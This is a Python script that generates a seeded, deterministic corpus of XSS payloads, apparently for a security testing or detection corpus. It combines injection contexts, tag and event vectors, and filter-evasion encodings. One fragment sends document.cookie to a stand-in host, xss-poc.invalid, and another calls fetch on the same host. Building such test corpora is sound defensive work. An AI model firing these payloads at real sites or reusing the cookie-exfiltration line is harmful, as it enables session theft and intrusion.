"""Own XSS payload generator for the clean Round 5 corpus.

Not derived from SecLists, PayloadsAllTheThings or any public payload
cheat sheet. Every payload is assembled from four independent dimensions
(contexto de inyeccion, vector, funcion ejecutada, codificacion) plus a
fifth (transporte y campo) that is applied at sampling time, not at
generation time, since it does not change the payload text itself.

Deterministic: same seed -> same candidate list, same order. No bare
random.random()/random.choice() calls; a single seeded random.Random
instance drives every choice, and candidates are built by iterating a
fixed, explicitly ordered combination list rather than relying on dict/set
iteration order.

Output: JSONL, one candidate per line, with the fields required by T4:
id, payload_raw, forma_enviada, contexto, vector, funcion, codificacion,
transporte, campo, endpoint, semilla, version_generador.

payload_raw is the XSS string itself, already including the codificacion
dimension (codificacion is a property of the payload text, same as it is
for the existing path_traversal/cmdi generators). forma_enviada is how
that text looks once placed on the wire for its transporte: for the
urlencoded transport, payloads whose codificacion is url_single or
url_double are ALREADY percent-encoded text and must not be percent-
encoded a second time when sent - the same pre-encoding convention
run_large_corpus.py already uses for path_traversal/cmdi (see
PRE_ENCODED_CATEGORIES there), extended here to this generator's own
url_single/url_double codificacion values. For multipart and json
transport, forma_enviada is the same text (no transport-level percent-
encoding applies to a multipart field value or a JSON string value).
"""
from __future__ import annotations

import base64
import json
import random
import sys
import urllib.parse
from pathlib import Path

VERSION_GENERADOR = "generate_xss.py v1 (2026-10-25)"

CONTEXTS = [
    "html_body",
    "attr_double",
    "attr_single",
    "attr_unquoted",
    "js_string",
    "url_href_src",
    "svg",
    "html_comment",
]

# Which vectors are syntactically meaningful inside each context. Not a
# full cross product - e.g. "javascript_uri" only makes sense where the
# injected value becomes the destination of href/src, not inside a free
# HTML body position.
CONTEXT_VECTORS: dict[str, list[str]] = {
    "html_body": ["script", "event_onerror", "event_onload_body", "event_ontoggle",
                  "event_onmouseover", "svg_onload", "iframe_srcdoc"],
    "attr_double": ["event_onerror", "event_onload_body", "event_onfocus_autofocus",
                     "event_ontoggle", "event_onmouseover", "svg_onload"],
    "attr_single": ["event_onerror", "event_onload_body", "event_onfocus_autofocus",
                     "event_ontoggle", "event_onmouseover", "svg_onload"],
    "attr_unquoted": ["event_onerror", "event_onmouseover", "svg_onload"],
    "js_string": ["script"],
    "url_href_src": ["javascript_uri"],
    "svg": ["svg_onload", "script", "event_onerror"],
    "html_comment": ["script", "event_onerror", "svg_onload", "event_onmouseover"],
}

FUNCTIONS = ["alert", "confirm", "prompt", "fetch_externo", "document_cookie",
             "fromcharcode", "eval_atob"]

CODIFICACIONES = ["raw", "url_single", "url_double", "html_entities_dec",
                   "html_entities_hex", "unicode_escape", "mixed_case",
                   "whitespace_tab_newline", "slash_for_space", "inline_comment"]

ENDPOINTS = [
    ("/posts", "content"),
    ("/posts", "title"),
    ("/profile", "bio"),
]
TRANSPORTES = ["urlencoded", "multipart", "json"]

# Transport that re-applies percent-encoding when sending a value (so a
# payload whose codificacion already is percent-encoded must be treated as
# pre-encoded, same convention as PRE_ENCODED_CATEGORIES in
# run_large_corpus.py). multipart/json never percent-encode field values.
PRE_ENCODED_CODIFICACIONES = {"url_single", "url_double"}


def _func_fragment(funcion: str) -> str:
    if funcion == "alert":
        return "alert(1)"
    if funcion == "confirm":
        return "confirm(1)"
    if funcion == "prompt":
        return "prompt(1)"
    if funcion == "fetch_externo":
        return "fetch('https://xss-poc.invalid/c')"
    if funcion == "document_cookie":
        return "new Image().src='https://xss-poc.invalid/c?'+document.cookie"
    if funcion == "fromcharcode":
        codes = ",".join(str(ord(c)) for c in "alert(1)")
        return f"eval(String.fromCharCode({codes}))"
    if funcion == "eval_atob":
        b64 = base64.b64encode(b"alert(1)").decode("ascii")
        return f"eval(atob('{b64}'))"
    raise ValueError(funcion)


def _vector_snippet(vector: str, func_fragment: str) -> str:
    if vector == "script":
        return f"<script>{func_fragment}</script>"
    if vector == "event_onerror":
        return f'<img src=x onerror="{func_fragment}">'
    if vector == "event_onload_body":
        return f'<body onload="{func_fragment}">'
    if vector == "event_onfocus_autofocus":
        return f'<input onfocus="{func_fragment}" autofocus>'
    if vector == "event_ontoggle":
        return f'<details ontoggle="{func_fragment}" open>'
    if vector == "event_onmouseover":
        return f'<div onmouseover="{func_fragment}">x</div>'
    if vector == "svg_onload":
        return f'<svg onload="{func_fragment}">'
    if vector == "iframe_srcdoc":
        escaped = func_fragment.replace("<", "&lt;").replace(">", "&gt;")
        return f'<iframe srcdoc="&lt;script&gt;{escaped}&lt;/script&gt;">'
    if vector == "javascript_uri":
        return f"javascript:{func_fragment}"
    raise ValueError(vector)


def _build_for_context(contexto: str, vector: str, func_fragment: str) -> str:
    snippet = _vector_snippet(vector, func_fragment)
    if contexto == "html_body":
        return snippet
    if contexto == "attr_double":
        return f'">{snippet}'
    if contexto == "attr_single":
        return f"'>{snippet}"
    if contexto == "attr_unquoted":
        return f">{snippet}"
    if contexto == "js_string":
        # Breakout of a double-quoted JS string literal into a new
        # statement, no HTML tag involved - "vector" stays "script" to
        # record that this is direct script execution, not a tag vector.
        return f'";{func_fragment};//'
    if contexto == "url_href_src":
        return snippet  # snippet IS the javascript: URI itself
    if contexto == "svg":
        return snippet
    if contexto == "html_comment":
        return f"-->{snippet}<!--"
    raise ValueError(contexto)


def _apply_codificacion(raw: str, codificacion: str, rng: random.Random) -> str:
    if codificacion == "raw":
        return raw
    if codificacion == "url_single":
        return urllib.parse.quote(raw, safe="")
    if codificacion == "url_double":
        return urllib.parse.quote(urllib.parse.quote(raw, safe=""), safe="")
    if codificacion == "html_entities_dec":
        return "".join(f"&#{ord(c)};" for c in raw)
    if codificacion == "html_entities_hex":
        return "".join(f"&#x{ord(c):x};" for c in raw)
    if codificacion == "unicode_escape":
        return "".join(f"\\u{ord(c):04x}" for c in raw)
    if codificacion == "mixed_case":
        out = []
        for c in raw:
            out.append(c.upper() if rng.random() < 0.5 else c.lower())
        return "".join(out)
    if codificacion == "whitespace_tab_newline":
        return raw.replace("<", "<\t", raw.count("<")).replace(">", "\n>", raw.count(">"))
    if codificacion == "slash_for_space":
        return raw.replace(" ", "/")
    if codificacion == "inline_comment":
        if "(" in raw:
            return raw.replace("(", "/**/(", 1)
        if "<" in raw:
            idx = raw.index("<")
            return raw[: idx + 1] + "!--x-->" + raw[idx + 1 :]
        return raw
    raise ValueError(codificacion)


def _forma_enviada(payload_raw: str, codificacion: str, transporte: str) -> str:
    # The wire-level value. For urlencoded, a payload already percent-
    # encoded by its own codificacion dimension must not be re-quoted
    # (same pre-encoding convention as run_large_corpus.py). Standard
    # (non-pre-encoded) urlencoded values go through one normal quote()
    # pass, same as the existing sqli/xss-placeholder flow. multipart and
    # json never percent-encode the field value, so forma_enviada equals
    # payload_raw there regardless of codificacion.
    if transporte == "urlencoded":
        if codificacion in PRE_ENCODED_CODIFICACIONES:
            return payload_raw
        return urllib.parse.quote_plus(payload_raw)
    return payload_raw


def generate(seed: int, count: int) -> list[dict]:
    rng = random.Random(seed)

    combos = []
    for contexto in CONTEXTS:
        for vector in CONTEXT_VECTORS[contexto]:
            for funcion in FUNCTIONS:
                for codificacion in CODIFICACIONES:
                    for endpoint, campo in ENDPOINTS:
                        for transporte in TRANSPORTES:
                            combos.append((contexto, vector, funcion, codificacion,
                                           endpoint, campo, transporte))
    rng.shuffle(combos)

    out: list[dict] = []
    seen_raw: set[str] = set()
    next_id = 0
    for contexto, vector, funcion, codificacion, endpoint, campo, transporte in combos:
        func_fragment = _func_fragment(funcion)
        built = _build_for_context(contexto, vector, func_fragment)
        payload_raw = _apply_codificacion(built, codificacion, rng)
        if payload_raw in seen_raw:
            continue
        seen_raw.add(payload_raw)
        forma_enviada = _forma_enviada(payload_raw, codificacion, transporte)
        out.append({
            "id": f"xss_{next_id}",
            "payload_raw": payload_raw,
            "forma_enviada": forma_enviada,
            "contexto": contexto,
            "vector": vector,
            "funcion": funcion,
            "codificacion": codificacion,
            "transporte": transporte,
            "campo": campo,
            "endpoint": endpoint,
            "semilla": seed,
            "version_generador": VERSION_GENERADOR,
        })
        next_id += 1
        if len(out) >= count:
            break
    return out


def main() -> None:
    seed = 20261025
    count = 400
    out_path = Path(__file__).parent / "xss_candidates_20261025.jsonl"
    candidates = generate(seed=seed, count=count)
    with open(out_path, "w") as f:
        for c in candidates:
            f.write(json.dumps(c) + "\n")
    print(f"{len(candidates)} candidatos escritos en {out_path}")


if __name__ == "__main__":
    main()
